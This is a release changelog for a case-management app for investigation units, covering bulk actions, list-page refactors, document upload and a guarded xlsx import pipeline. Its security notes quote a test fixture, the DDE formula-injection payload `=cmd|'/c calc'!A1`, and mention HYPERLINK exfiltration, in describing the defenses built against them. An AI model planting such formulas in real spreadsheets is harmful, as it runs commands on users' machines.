**Shell parity audit matrix** (`docs/audit/shell-parity-matrix.md`):
- 39+ features identified missing across 4 shells (Cases/Incidents/
  Petitions/Comprehensive) vs legacy commit 2cbdd90.
- Truth-of-record for PR2-4 (Incidents/Petitions/Comprehensive) follow-ups.

### Changed

- `App.tsx` mounts AssignModalProvider + DeleteResourceModalProvider inside
  ProtectedRoute wrapper.
- `CaseListPageShell.tsx`:
  - Adds 'Thao tác' as first column (8rem width) rendering RowActions.
  - Passes <Filters> as children of <ListPageShell.Toolbar> (accordion-driven).
  - List fetch dep extended with appliedFilters; spreads fromDate/toDate/unit/
    investigator/charges into /cases GET params.
  - handleResetFilters now also clears advanced filter draft + URL.
  - activeFilterCount aggregates status + search + N applied advanced filters.

### Tests

- 56 new unit tests covering registry primitives, RowActions component,
  Filters component, useListFilters hook, modal providers, Cases registrations,
  ActionMenuPortal a11y.
- Total: 1143/1143 frontend tests passing.
- TypeScript strict + ESLint clean.

### Deferred to PR2-PR5

- PR2 v0.64: Incidents shell registrations + wire (5 actions + 4 filters).
- PR3 v0.65: Petitions shell (9 actions + 5 filters).
- PR4 v0.66: Comprehensive polyglot dispatch (3 actions + 7 filters).
- PR5: husky pre-commit + CI workflow blocking future swap PRs without
  updating shell-parity-matrix.md (process fix from CEO review).

## [0.62.0.0] - 2026-05-30

**v0.62 Upload tài liệu cho Đơn thư + Vụ việc — đồng nhất 3 module**

Cán bộ giờ upload PDF / Word / ảnh / video kèm trực tiếp vào Đơn thư và Vụ việc
y hệt Vụ án. Trước đây Đơn thư chỉ có ô ghi chú text "Tài liệu đính kèm" và Vụ
việc không có UI upload (mặc dù backend đã sẵn sàng). Bridge gap hoàn toàn.

### Added

**File upload UI cho Đơn thư + Vụ việc** (`/components/documents/EntityDocumentsTab`):
- Component generic dùng chung cho cả 3 module Vụ án / Vụ việc / Đơn thư.
- Tham số hoá copy theo `entityKind` — title, testid, guard message đều adapt.
- Hỗ trợ upload đơn-file 10MB, validate magic-byte server-side, list/open/download/xoá.
- Section "Tài liệu" xuất hiện trong PetitionFormPage + IncidentFormPage khi edit mode.

**Backend Document model petitionId FK** (`backend/prisma/schema.prisma`):
- Thêm `Document.petitionId` với `onDelete: Restrict` (chain-of-custody cho đơn).
- Petition soft-delete (deletedAt) bình thường; hard-delete bị chặn nếu còn document.
- Migration `add_petition_id_to_document` — nullable FK + index, an toàn cho prod ~100 docs.

**Storage quota guard** (`MAX_DOCUMENTS_PER_ENTITY=50` env):
- Bảo vệ disk VM khỏi cạn quota khi user upload không kiểm soát.
- Default 50 doc/entity, configurable qua env, set 0 disable.
- Fail-closed cho env malformed (NaN fallback về default).

**Petition scope helper** (`assertPetitionParentInScope`):
- Tách riêng khỏi `assertParentInScope` vì Petition dùng `enteredById` (creator) thay vì `investigatorId`.
- Tránh silent ACL bug — creator vẫn truy được document của đơn mình tạo.

### Changed

**Document handoff khi chuyển đơn thành vụ án / vụ việc**:
- `convertToCase`: documents tự re-link `petitionId → caseId` trong cùng transaction.
- `convertToIncident`: documents re-link `petitionId → incidentId` (non-atomic, acceptable).
- Tab "Tài liệu" của Case/Incident mới hiển thị evidence từ đơn gốc.

**Document scope queries soft-delete cascade**:
- Document linked đến petition đã soft-deleted không leak qua scope OR queries nữa.
- Filter `petition: { deletedAt: null }` thêm vào documents.service getList.

**Petition `attachmentsNote` field**:
- Rename label "Tài liệu đính kèm" → "Ghi chú tài liệu đính kèm".
- Giữ field cho ghi chú text bổ sung; file thực ở section Tài liệu bên dưới.

### Fixed

**Multer file cleanup khi service.create fail**:
- Trước đây file đã ghi đĩa qua multer + validate fail (vd cross-team scope) → file rác.
- Controller giờ wrap service.create try/catch + `fs.unlinkSync(file.path)` khi catch.

**TabBusinessFiles thin wrapper** (CaseFormPage):
- Refactor inline upload UI ~220 LOC vào EntityDocumentsTab dùng chung 3 module.
- Backward compat: named export `TabBusinessFiles` giữ nguyên (1-line wrapper).

## [0.56.0.0] - 2026-05-30

**v0.56 ListPageShell F1 — Route swap legacy → shell pages**

Tiếp ngay sau khi PR5 đóng plan, anh decide route swap "tự nhiên" (no soak,
không feature flag — chưa có user thực tế). 6 routes files swapped to import
shell components instead of legacy.

### Changed

**Route imports swapped** (production users now see shells):
- `/cases` → `CaseListPageShell` (PR1)
- `/incidents` → `IncidentListPageShell` (PR2 với phase tabs)
- `/petitions` → `PetitionListPageShell` (PR2)
- `/comprehensive-list` → `ComprehensiveListPageShell` (PR2 3-entity fan-out)
- `/lawyers` → `LawyerListPageShell` (PR4 + bulk-delete v0.51)
- `/objects` + `/people/suspects` → `ObjectListPageShell subjectType=SUSPECT`
- `/people/victims` → `ObjectListPageShell subjectType=VICTIM`
- `/people/witnesses` → `ObjectListPageShell subjectType=WITNESS`

UTDT (/uy-thac-dieu-tra) + DeadlineRules (/admin/deadline-rules) đã refactor
in-place trong PR3 — không cần route swap.

### Deferred

- Delete legacy files (CaseListPage.tsx + 7 others) sau 2+ release soak
- F2-F6 follow-ups (backend /cases/stats?caseType=, dedupe utilities,
  PageHeader.tsx deletion, lawyer/subject bulk-export, production soak metrics)

## [0.55.0.0] - 2026-05-30

**v0.55 ListPageShell PR5 — ObjectListPageShell (polymorphic) + subjects bulk-delete**

PR5 closes the 5-PR ListPageShell plan. Subjects (Suspect/Victim/Witness) get
bulk-delete UI via single polymorphic shell. Same pattern as PR4 lawyers, plus
1 extra Codex fix for the polymorphism boundary.

### Added

**ObjectListPageShell** (polymorphic SUSPECT/VICTIM/WITNESS):
- Single shell with TYPE_CONFIG map per subjectType
- URL prefix per type: `objects_` / `victims_` / `witnesses_`
- Resource labels: bị can / bị hại / nhân chứng (shown in BulkActionBar)
- Page titles, icons (Users/UserCheck/UserX), API filter `?type=`
- 4 SubjectStatus chips qua ListPageShell.StatusChips
- Trust boundary: SubjectStatus enum + control-char strip
- Page clamp + 300ms debounce + AbortController + Vietnamese error map

**Subjects bulk adapter**:
- `frontend/src/features/_shared/bulk/adapters/subjects.ts`
- POST /subjects/bulk-delete (v0.51 backend), confirm modal, escalating friction
- Permission gate: `'objects'/'delete'`
- Resource label override per subjectType

### Fixed

- **/codex PR5 P2: Polymorphism boundary stale selection** — Polymorphic shell
  reused with different subjectType (same URL state) would keep selected IDs
  from previous type in BulkActionBar. Added `subjectType` to clear-effect deps.

### Tests

- 22 vitest integration tests (mount + polymorphism for SUSPECT/VICTIM/WITNESS
  + bulk select + delete flow + trust boundary + polymorphism clear)
- Frontend: 1085 tests total, 0 fail. tsc clean.

### Final state — ListPageShell plan complete (5/5 PRs)

PR1 (foundation + Cases canonical) → PR2 (Pattern A: Incident/Petition/Comprehensive)
→ PR3 (UTDT + DeadlineRules + URL trust boundary) → PR4 (Lawyer + bulk v0.51)
→ PR5 (Object polymorphic + bulk v0.51).

### Deferred to follow-up

- Feature-flag swap legacy → shell pages for ALL 10 list pages
- /cases/stats?caseType= endpoint cho UTDT chip counts
- Extract shared shell utilities (error mapper, sanitize helpers, FilterSelect)
- Delete PageHeader.tsx + refactor CaseFormPage inline header

## [0.54.0.0] - 2026-05-30

**v0.54 ListPageShell PR4 — LawyerListPageShell + bulk-delete UI integration**

PR4 đưa bulk-delete v0.51 (backend đã có sẵn) lên frontend qua shell pattern.
LawyerListPageShell shipped alongside legacy LawyerListPage (feature-flag swap
later).

### Added

**LawyerListPageShell** (new shell, alongside legacy LawyerListPage):
- ListPageShell.Header + Toolbar + Table state machine + Pagination
- useListPageUrlState('lawyers') — search + page URL state
- 300ms debounce + AbortController + page clamp
- Search trust boundary (sanitizeStringParam strip control chars)
- Vietnamese error map (401/403/5xx)

**Bulk-delete integration** (plan PR4 deliverable):
- New `frontend/src/features/_shared/bulk/adapters/lawyers.ts` — single delete action
- Wired via `useBulkSelection` + `BulkSelectionHeaderCell`/`RowCell` + `BulkActionBar`
- ConfirmModal với reason textarea ≥10 chars (BLTTHS audit trail)
- Permission gate: `'lawyers'/'delete'` (backend enforces creator-or-admin per row)
- Escalating friction (10 / 50 / 200 thresholds via shared BulkActionBar)
- Success/skipped/failed counts shown in transient banner
- Post-bulk: refetch + selection cleared

### Fixed

- **/codex P2: Stale selection race** — Selection now clears synchronously on
  page/search change (was: 300ms debounce window allowed submitting IDs from
  previous page/filter scope).
- **/codex P2: Case column rendering** — Use `case.name` (actual API contract);
  was `case.caseCode` which API doesn't return → showed `—` for every row.

### Tests

- 21 vitest integration tests covering: mount, fetch, empty/empty-filtered,
  bulk select-all, partial select, toggle, row highlight, Xóa button visibility,
  confirm modal flow, success banner, error banner, skipped count, search URL,
  page URL, control chars, case.name render, pagination-next clears, search clears
- Frontend: 1062 tests total (was 1042), 0 fail. tsc clean.

### Deferred

- Replace legacy LawyerListPage routing → feature-flag swap (follow-up)
- /codex review specialist suggestion: dedupe error mapper across 5 shells

## [0.53.0.0] - 2026-05-30

**v0.53 ListPageShell PR3 — UTDT refactor (anh's original complaint) + DeadlineRules + URL trust boundary**

PR3 đóng ticket gốc của anh: UyThacDieuTraListPage UI giờ đồng nhất với
Cases/Incidents/Petitions qua ListPageShell compound API. Cộng với refactor
DeadlineRulesListPage và 6 sanitizer trust boundary cho URL filters (Codex P2).

### Added

**UTDT refactor**:
- `UyThacDieuTraListPage` chuyển sang `<ListPageShell>` — Header + StatusChips
  (4 TrangThaiPhanHoi) + Toolbar + Table state machine + Pagination
- Modal delete với reason textarea (≥10 chars, BLTTHS Đ.46 audit trail) thay
  `window.confirm()` — proper a11y + escape-to-close + reason validation
- URL state via `useListPageUrlState('utdt')` — 9 params (status, page, q, cs,
  lut, dv, tnf, tnt, inv) bookmark-restorable
- 6 advanced filters trong Toolbar accordion (caseStatus + loaiUyThac + donViGiao
  + investigator + ngayTiepNhan from/to)
- Slate palette toàn diện (zero gray-*)
- 300ms search/investigator debounce + AbortController cancellation
- Vietnamese error map (401/403/5xx)
- Overdue row highlighting via OVERDUE_ROW_HIGHLIGHT token
- AUDIT_REASON_MIN_LENGTH=10 shared constant (drift-detection ready)

**DeadlineRulesListPage refactor**:
- ListPageShell.Header thay raw `<div>` header
- Summary strip stays (positional child giữa Header + Table)
- Action buttons (approval queue + migration cleanup) qua Header.actions slot
- A11Y_FOCUS_RING applied; tracking-wide thay uppercase (Vietnamese-friendly)
- TẤT CẢ data-testids preserved cho test compat

**New shared token**:
- `TRANG_THAI_PHAN_HOI_CHIPS` shape (value + shortLabel + label) cho shell consumption

### Fixed

- **/codex P2: URL filters trust boundary** — TẤT CẢ filter URL params sanitized:
  - Enum params (cs/lut) validated qua CaseStatus/LoaiUyThac Set
  - Date params (tnf/tnt) qua ISO_DATE_RE + calendar-valid check
  - Free-text params (dv/inv/q) strip ASCII control chars + length cap
  - Invalid values degrade gracefully to "no filter" thay vì 400 hoặc NaN date
- **/codex P2: URL page out-of-range** — useEffect clamp khi totalCount lands:
  page > totalPages → setParam('page', '1'). Handles bookmarked utdt_page=999
  và last-row-deleted scenarios.
- **/review: UTDT chip count honest** — count: undefined (no /stats endpoint =
  no partial counts misleading users)

### Changed

- Test coverage: 18 vitest tests for UTDT (was 1), 6 for DeadlineRules (was 5)
- DeadlineRules test adds PR3 shell wrapping integration check

### Deferred (PR4 follow-up)

- Delete `PageHeader.tsx` — still used by CaseFormPage (form, not list)
- Extract `UtdtDeleteModal` + `FilterSelect`/`FilterInput` to shared
- Search debounce test với fake timers
- Backend `/cases/stats?caseType=UY_THAC_DIEU_TRA` cho UTDT chip counts

## [0.52.0.0] - 2026-05-30

**v0.52 ListPageShell PR2 — Pattern A pages refactor + backend stats endpoints**

Tiếp PR1 (CaseListPageShell + foundation), PR2 đưa ListPageShell xuống 3 list pages còn lại
thuộc Pattern A: Incident (với phase tabs BCA TT28/2020), Petition (single workflow), và
Comprehensive (3-entity fan-out tổng hợp Vụ án + Vụ việc + Đơn thư).

### Added

**Backend endpoints**:
- `GET /api/v1/incidents/stats` — server-aggregated count theo IncidentStatus (15 keys exhaustive). Snapshot-consistent total derived từ `groupBy` rows. DataScope enforced.
- `GET /api/v1/petitions/stats` — server-aggregated count theo PetitionStatus (7 keys exhaustive). Cùng pattern.
- DTOs `QueryIncidentsStatsDto` + `QueryPetitionsStatsDto` qua `OmitType` — ValidationPipe whitelist:true reject misleading params (status/limit/offset/sortBy/sortOrder) với 400.

**Frontend ListPageShell consumers**:
- `IncidentListPageShell.tsx` — useListPageUrlState('incidents'), 15 status chips, 4 BCA phase tabs (tiếp nhận/xác minh/kết quả/tạm đình chỉ) render giữa Header + StatusChips. Trust boundary: status + phase URL params validated qua enum + Set. Overdue rows highlighted. 18 vitest integration tests.
- `PetitionListPageShell.tsx` — useListPageUrlState('petitions'), 7 status chips, single workflow. 14 vitest tests.
- `ComprehensiveListPageShell.tsx` — 3-entity tổng hợp (Vụ án/Vụ việc/Đơn thư), useListPageUrlState('comp'), "Tất cả" fan-out 3 endpoints + merge sort desc by createdAt, single-type mode dùng server pagination. Counts derived từ list response totals khi fan-out (saved 3 requests/keystroke). 13 vitest tests.

**Database**:
- Migration `20260530000002_pr2_incidents_petitions_stats_index` — partial composite indexes `(deletedAt, status) WHERE deletedAt IS NULL` cho `incidents` + `petitions` tables. Mirror PR1 Cases pattern. Speeds up groupBy hot path.

### Changed

- `IncidentsService.getStats(query, dataScope)` — full filter pass-through (search/phase/investigator/unit/overdue/district/ward/team/loaiDonVu/benVu/tinhTrangHoSo/tinhTrangThoiHieu/canBoNhapId/dateRange). Exhaustive byStatus reduce. Old `getStats(dataScope)` legacy spec rewritten for new contract.
- `PetitionsService.getStats(query, dataScope)` — filter pass-through (search/unit/senderName/fromDate/toDate/overdue/wardTeamId).

### Fixed

- Comprehensive shell over-report bug: `totalCount` capped tại `merged.length` thay vì sum server totals — user không thấy empty pages khi navigate quá preview buffer.
- Comprehensive stats fan-out gate by typeFilter — saved 3 stats requests/keystroke trong "Tất cả" mode.
- Incident phase tab values: kebab-case slugs match backend `PHASE_STATUSES` keys (UPPER_SNAKE_CASE silently no-op — caught by /codex review).
- `IncidentsService.getStats` `where.subjects` removed — Incident model has no Subject relation; copied from getList template was wrong.

### Tests

- Backend: +16 jest tests (incidents stats spec 8, petitions stats spec 8, both with DataScope filter test).
- Frontend: +45 vitest tests (18 Incident + 14 Petition + 13 Comprehensive shell integration).
- Total: 2055 backend + 1025 frontend = 3080 tests green. tsc clean. Prisma schema valid.

### Review notes

- `/review` specialist dispatch found 2 CRITICAL issues on Comprehensive shell (over-report + redundant fan-out) — both fixed before /ship.
- `/codex review` GATE: PASS (0 P1). 1 P2 (phase slug case mismatch) — fixed.

## [0.51.0.0] - 2026-05-29

**v0.51 Bulk Actions — PR4: Lawyers + Subjects bulk-delete**

Tiếp expand bulk-delete xuống child resources (Lawyers, Subjects). Scope check qua
parent case (mirror `assertParentInScope` pattern).

### Added

**Backend endpoints**:
- `POST /api/v1/lawyers/bulk-delete` — soft delete N luật sư. Preflight scope filter qua parent case → out-of-scope = PERMISSION skip.
- `POST /api/v1/subjects/bulk-delete` — soft delete N đối tượng (Bị can/Bị hại/Nhân chứng). Tương tự scope qua case.

Cả 2 không có bulk-restore (single endpoints không restore).

### Tests
- Backend +6 tests (3 Lawyers + 3 Subjects). Full suite **2030/2030** pass.

### Deferred
- UTDT (Ủy thác điều tra) bulk-export — next cycle nếu cần.
- DeadlineRules bulk-delete (admin tool, low-value).
- Frontend wire LawyersListPage + SubjectsListPage (deferred — separate UX work).

## [0.50.0.0] - 2026-05-29

**v0.50 Bulk Actions — PR3: Incidents + Petitions bulk-delete + bulk-restore**

Mở rộng destructive bulk actions sang Incidents + Petitions, mirror Cases pattern shipped ở v0.49.

### Added

**Backend endpoints**:
- `POST /api/v1/incidents/bulk-delete` — soft delete N vụ việc. Preflight per-item match `previewDelete` (incidents.service.ts:681):
  - Status TIEP_NHAN only → khác → INELIGIBLE skip
  - 0 linked petitions → có → INELIGIBLE
  - 0 linked documents → có → INELIGIBLE
  - scope filter → out-of-scope = PERMISSION skip
- `POST /api/v1/incidents/bulk-restore` — admin restore N vụ việc (`@RequirePermissions restore`). Preflight `deletedAt = null` → NOT_FOUND.
- `POST /api/v1/petitions/bulk-delete` — soft delete N đơn thư (scope filter only, không preflight phức tạp như Cases/Incidents).
- `POST /api/v1/petitions/bulk-restore` — admin restore N đơn thư.

**Frontend**:
- `incidents.ts` adapter: deleteAction (variant=danger) + restoreAction. `enableDelete` flag.
- `petitions.ts` adapter: deleteAction + restoreAction. `enableDelete`/`enableRestore` flags.
- `IncidentListPage`: enableDelete=true. Nút "Xóa" danger trong BulkActionBar + ConfirmModal reason 10-500.

### Tests
- Backend +11 tests (Incidents 6, Petitions 5). Full suite: **2024/2024** pass.
- Frontend 794/794 pass.

### Deferred
- Petitions list page wire bulk-delete (existing Word ZIP select-all conflict — separate sprint).
- Lawyers/Objects/UTDT bulk-export + bulk-delete (next cycle v0.51+).
- Preview modal sample-first-10.
- Undo 10s post-delete.
- Bulk-restore admin list UI surface.

## [0.49.0.0] - 2026-05-29

**v0.49 Bulk Actions — PR2: Cases bulk-delete + bulk-restore**

Tiếp nối v0.48 PR1, ship destructive bulk actions cho Cases sau khi v0.32 soft-delete + restore primitives đã sẵn. Plan v2 PR2 — carve sau CEO finding F2 (investigation system: destructive không ship trước recovery).

### Added

**Backend endpoints**:
- `POST /api/v1/cases/bulk-delete` — soft delete N vụ án (1..100). Per-item preflight match single-delete invariants:
  - Status TIEP_NHAN only → khác → skipped INELIGIBLE.
  - 0 linked subjects/lawyers/conclusions/documents → có → skipped INELIGIBLE với detail message.
  - Actor là creator HOẶC ADMIN → khác → skipped INELIGIBLE.
  - DataScope filter applied (out-of-scope = PERMISSION skip).
  - Per-item tx: `tx.case.update({deletedAt: NOW})` + audit `CASE_DELETED` (E-H3 atomicity).
- `POST /api/v1/cases/bulk-restore` — khôi phục N vụ án (admin via `@RequirePermissions restore`).
  - Preflight: items có `deletedAt = null` → NOT_FOUND skip.
  - Per-item tx: `tx.case.update({deletedAt: null})` + audit `CASE_RESTORED`.

**Frontend**:
- `cases.ts` adapter mở rộng với `deleteAction` (variant=danger, requiresPreview=true) + `restoreAction` (variant=primary).
- `CaseListPage` enable bulk-delete qua `buildCasesAdapter({ enableDelete: true })`.
- BulkActionBar danger variant tự động map sang nút đỏ + ConfirmModal `variant=danger`.

### Tests
- Backend +10 tests cover: bulkDelete happy path + TIEP_NHAN guard + linked-records skip + creator/admin check + ADMIN bypass + cap 1..100 + audit-in-tx + bulkRestore happy path + NOT_FOUND skip + cap.
- Backend full suite: **2013/2013** pass.
- Frontend 794/794 pass + tsc clean.

### Deferred to follow-up
- Incidents bulk-delete + bulk-restore (next cycle — preflight v0.43 reuse).
- Petitions/UTDT/Lawyers/Objects bulk-delete.
- Preview modal với sample-first-10-items list (current: simple confirm + reason).
- Undo button 10s post-delete.
- Bulk-restore admin-only UI surface (currently chỉ ở backend, list deleted page chưa expose).

## [0.48.0.1] - 2026-05-29

**v0.48 Bulk Actions — Patch 1: Codex post-deploy audit fixes (3 P2 findings)**

Fix-forward 3 P2 correctness bugs Codex caught khi audit v0.48.0.0 sau deploy.

### Fixed

- **Petitions bulk-export scope filter** (`backend/src/petitions/bulk/petitions.bulk.service.ts`): chuyển từ `buildScopeFilter` chung (inject `investigatorId` predicate không hợp lệ với Petition schema) sang `buildPetitionScopeFilter` (filter qua `enteredById`/`assignedTeamId`/`assignedToId`). Non-admin scoped users gọi `/petitions/bulk-export` không còn fail với Prisma "Unknown field" error.

- **Incidents bulk-assign invariants** (`backend/src/incidents/bulk/incidents.bulk.service.ts`): preflight phase bây giờ skip items có `TERMINAL_STATUSES` (vd `DA_GIAI_QUYET`) với reason `INELIGIBLE` + message "Không thể phân công điều tra viên cho vụ việc đã kết thúc". Mỗi item được assign investigator → transition status sang `DANG_XAC_MINH` (match single-assign invariant ở `incidents.service.ts:1127`). Trước fix: cho phép reassign vụ việc đã đóng + trạng thái không sync.

- **Idempotency P2002 conflict handling** (`backend/src/audit/audit.service.ts`): `logBulkHeader` catch Prisma P2002 unique constraint violation khi retry với cùng `(actorId, idempotencyKey)` → lookup existing `bulk_operations.id` qua `$queryRaw` + return id đó thay vì throw. Retry-safe contract bây giờ thực sự hoạt động. Non-P2002 errors vẫn rethrow.

### Tests
- +5 new tests: petition scope filter shape, incident terminal-status skip, incident DANG_XAC_MINH transition (with/without investigator), idempotency P2002 catch + non-P2002 rethrow.
- Full backend suite: 2003/2003 pass.

## [0.48.0.0] - 2026-05-29

**v0.48 Bulk Actions — PR1 Foundation + Export**

End-to-end bulk-action infrastructure cho 3 list pages chính (Cases, Incidents, Petitions backend). Frontend UI ship export-only ở v0.48; bulk-assign action sẵn ở backend + adapter nhưng yêu cầu team picker modal (defer PR sau). Bulk-delete + bulk-restore tách PR2 (v0.49) sau khi soft-delete restore UI hoàn thiện — per CEO review F2 (investigation system safety: destructive actions không ship trước recovery actions).

### Added

**Backend bulk infrastructure**:
- `backend/src/common/bulk/run-bulk.ts` — per-item Prisma transaction utility với partial-success accumulator + preflight phase + per-item tx isolation (Postgres abort semantics).
- `BulkOperation` Prisma model + `bulk_operations` migration — header rows STARTED→COMPLETED|FAILED tracking N item ops + idempotency key cho retry safety.
- `audit_logs.bulkOperationId` FK column linking N item audit rows to 1 bulk header.
- `AuditService.logBulkHeader / logBulkItem (in tx) / completeBulk` — audit-atomic-with-data-write pattern (plan eng E-H3).

**Backend endpoints** (6 mới):
- `POST /api/v1/cases/bulk-assign` — DispatchGuard, ids 1..100, reason 10-500, optimistic lock optional.
- `POST /api/v1/cases/bulk-export` — RequirePermissions read, ids 1..1000, xlsx stream với BcaExcelHelper brand.
- `POST /api/v1/incidents/bulk-assign` + `/bulk-export` — mirror Cases pattern.
- `POST /api/v1/petitions/bulk-assign` + `/bulk-export` — mirror Cases pattern.

**Frontend bulk infrastructure**:
- `useBulkSelection` hook — page/all-matching-filter mode, auto-clear on filter change, 3-state header checkbox.
- `BulkActionBar` component (sticky-bottom z-30) — escalating friction (10/50/200 thresholds), permission gating, 'all-matching-filter' guard cho export-only.
- `BulkSelectionColumn` — checkbox column helper (a11y compliant: aria-checked="mixed", aria-label per row, indeterminate state).
- `InlineResultPanel` — persistent above-table panel với expandable detail cho skipped/failed items (vs vanishing toast).
- Adapters cho Cases/Incidents/Petitions với enableAssign flag (default false v0.48).

**Wired list pages**:
- `CaseListPage` — checkbox column + bulk export Excel.
- `IncidentListPage` — checkbox column + bulk export Excel.

### Architecture decisions (from CEO + Eng + Design review autoplan)

- Per-item Prisma transaction (Postgres abort tx semantic).
- Composition runBulk utility, KHÔNG base class (E-C1).
- BulkSelectionColumn helper thay vì extend shared DataTable (list pages PC02 không dùng DataTable, E-C1 verified).
- DispatchGuard cho bulk-assign match single-assign authority (no privilege escalation, E-C4).
- Preflight scope filter — silent PERMISSION skip (E-H4).
- `actorId` nullable + ON DELETE SET NULL trên BulkOperation — audit retention.
- 'All matching filter' chỉ cho export action (F4 risk guard CEO).

### Tests

- Backend: +28 unit + integration tests. Full suite 1992/1992 pass.
- Frontend: +7 useBulkSelection tests. Full suite 794/794 pass.

### Deferred to follow-up PR
- bulk-delete + bulk-restore (PR2 v0.49, sau khi soft-delete UI sẵn).
- bulk-transfer + bulk-change-status + bulk-extend-deadline (Incidents).
- Lawyers/Objects/UTDT/DeadlineRules bulk-export modules.
- Team picker modal cho bulk-assign UI integration.
- 'Select all matching filter' banner UI + `?fields=id` projection endpoints.
- PetitionListPage wire (đang có select-all riêng cho Word ZIP batch v0.47).
- Cases status transition bulk (BLTTHS state machine — PR3).

## [0.47.0.7] - 2026-05-29

**v0.47 Document + Report Template Engine — PR6 Track B Import Part 2 (CRITICAL — data mutation)**

PR6 closes the v0.47 import pipeline. Materialises PR5 staging rows into Case/Incident under a dual-admin approval gate with full rollback. This is the **CRITICAL** half of v0.47 — every safety primitive Codex flagged as mandatory for data-mutation imports is implemented and unit-tested before the first row touches a domain table.

### Added
- **3 new endpoints** (admin-only):
  - `GET /api/v1/xlsx-imports/:id/preview` — dry-run reading staging rows + conflict detection (no mutations)
  - `POST /api/v1/xlsx-imports/:id/commit` — dual-confirm state machine; step 1 captures first admin, step 2 by a different admin within 24h materialises Case/Incident rows
  - `POST /api/v1/xlsx-imports/:id/rollback` — cascade delete on `importLogId` + status `ROLLED_BACK`
- **`XlsxImportCommitService`** (`commit.service.ts`) — the orchestrator. State machine: `PARSED → PENDING_SECOND_CONFIRM → COMMITTED`; from COMMITTED → ROLLED_BACK. Same admin self-confirm → 409; admin B past 24h → 400 with `code: DUAL_CONFIRM_TTL_EXPIRED`.
- **`payload-mapper.ts`** — best-effort header detection (recognises STT, Mã VA / Mã VV / Mã hồ sơ, Tên vụ án / Tên vụ việc / Tên, Tội danh, ngày tiếp nhận / ngày khởi tố, đối tượng, địa điểm) → skeleton mapping. Same mapper runs in dry-run and commit, so the preview snapshot equals the commit outcome.
- **`commit.constants.ts`** — `DUAL_CONFIRM_TTL_MS=24h`, `DRYRUN_SAMPLE_ROWS_PER_SHEET=5`, `IMPORT_SOURCE_TAG='xlsx-phu-luc'`, `IMPORT_DEFAULT_CASE_PROVENANCE='TRANSFERRED'` (BLTTHS Đ.143 — these come from outside the system), status enum.
- **Conflict detection** in dry-run (commit does NOT block — officers reconcile via existing Case/Incident edit UI in v0.48):
  - `duplicate_id` — staging caseCode/incidentCode matches an existing row
  - `unit_mismatch` — existing row's unit differs from `log.unitCodeDetected`
- **Materialisation rules**:
  - Case rows: `name` from "Tên" column or fallback "Imported row {rowIndex}", `caseProvenance: TRANSFERRED`, `caseCode` from staging if present, `metadata` = full original payload, all import audit fields set
  - Incident rows: `name` from "Tên" column, `code` from "Mã VV" or deterministic `VV-IMP-{logId[0:8]}-{rowIndex}`, all import audit fields set
  - Every materialised row carries `importLogId` FK (provenance invariant — unit-tested)

### Iron rules satisfied (Codex CRITICAL final review)
- ✅ Two **different** admins must approve within 24h before any Case/Incident row is created
- ✅ Every materialised row carries `importLogId` provenance (FK from PR1 schema)
- ✅ Rollback cascades via `importLogId` deleteMany, NOT via log delete (schema is `SetNull` on log delete so investigations never orphan if an admin nukes the log row directly)
- ✅ Dry-run uses the SAME `mapSheetToSkeletons` code commit uses — snapshot equality between preview and outcome

### Test counts
- New: **18 commit.service.spec tests** — RBAC × 3, dryRun × 4 (404 + grouping + conflicts × 2), commit × 8 (first-confirm + same-admin-rejection + cross-admin success + TTL expiry + already-COMMITTED + FAILED + ROLLED_BACK + provenance invariant), rollback × 3 (cascade + already-rolled + FAILED)
- Backend total: **1953 pass** (+18 from PR5 ship at 1935)
- `npx tsc --noEmit` clean

### Deferred to v0.48
- Frontend upload + preview + commit + rollback UI (current admin uses gh CLI / curl)
- Officer reconciliation UI: merge xlsx fields field-by-field with existing Case/Incident on `duplicate_id` (override / skip / merge actions)
- Per-field column mapping editor for non-standard đơn vị xlsx variants

## [0.47.0.6] - 2026-05-29

**v0.47 Document + Report Template Engine — PR5 Track B Import Part 1 (HIGH SECURITY)**

PR5 ships the upload + parse half of the xlsx import pipeline. Every defense from the Codex final review hostile-xlsx kit is implemented BEFORE any disk write or parser call. No commit endpoint, no mutations against Case/Incident — parser writes ONLY to `xlsx_import_staging`. Commit (dual-confirm + rollback) lands in PR6.

### Added
- **`backend/src/xlsx-imports/` module** with controller, orchestration service, parser service, immutable storage service, and the hostile-xlsx defense kit. Wired in `app.module.ts`.
- **`POST /api/v1/xlsx-imports`** (admin-only, throttled 10/min): multipart upload returning `{ logId, sha, dedupeHit, unitCodeDetected, succeededRows, sheetsParsed }`.
- **`GET /api/v1/xlsx-imports/:id`** and **`GET /api/v1/xlsx-imports`** for listing — admin sees all, others see own.
- **Hostile xlsx defense kit** (`hostile-xlsx-guard.ts`):
  - MIME magic-byte check via ZIP local file header (PK\x03\x04) — rejects renamed binaries before exceljs touches them. Hand-rolled because `file-type@22` is ESM-only and breaks ts-jest.
  - Compressed-size cap: 50 MB (also enforced at multer layer).
  - Zip-bomb defense by EOCD + central directory walker WITHOUT decompressing — rejects ratio > 100×, single-member uncompressed > 500 MB, or corrupt EOCD signature.
  - Sheet count cap (20), row cap per sheet (100k), cell length clamp (32k chars, truncates rather than aborts).
  - Parser timeout 30s via `Promise.race` (unref'd).
  - Formula stripping on IMPORT direction: leading `=`, `+`, `-`, `@`, `\t`, `\r` removed from string cells. Distinct from PR4 export `escapeXlsxCell` (PR4 prefixes `'`; here we strip).
  - SHA256-based dedupe + idempotent immutable storage at `uploads/xlsx-imports/{sha}.xlsx` chmod 0o444.
- **Staging-only invariant**: `XlsxParserService` cannot import `prisma.case` / `prisma.incident`. Unit-tested with a mock prisma that asserts `case.create` / `incident.create` are NEVER called for either Phụ lục 01-03 or 04-06 sheet patterns.
- **Sheet name → type detection**: Phụ lục 01-03 → Incident, Phụ lục 04-06 → Case, unmappable → null. Regex normalised for accents and 0-padded variants.
- **Unit code extraction** from filename via best-effort regex covering observed FILE GUI PC01 patterns (DOI6, KV7, CS1, PC02, CSGT3, "Đội 3"). Diacritic strip on the key letter.

### Security review
- 34 new tests across 3 specs cover every defense. Adversarial fixtures: renamed `.exe` payload, plain-text upload, corrupt zip (no EOCD), formula-injection `=cmd|'/c calc'!A1`, HYPERLINK exfil, oversized cell.
- Codex CRITICAL findings #3 (staging vs direct upsert), #4 (formula stripping), #7 (admin RBAC) all implemented.
- Path-traversal-shaped SHAs are rejected by `resolvePathFromSha` regex (must be 64-char hex).

### Test counts
- Backend: 1927 pass (+34 from baseline 1893 at PR4 ship) — 1 flaky 2FA test passes in isolation, same pre-existing race as PR4
- Frontend: 787/787 (unchanged)
- `npx tsc --noEmit` clean

### Deferred to PR6 (Track B Import Part 2 — CRITICAL)
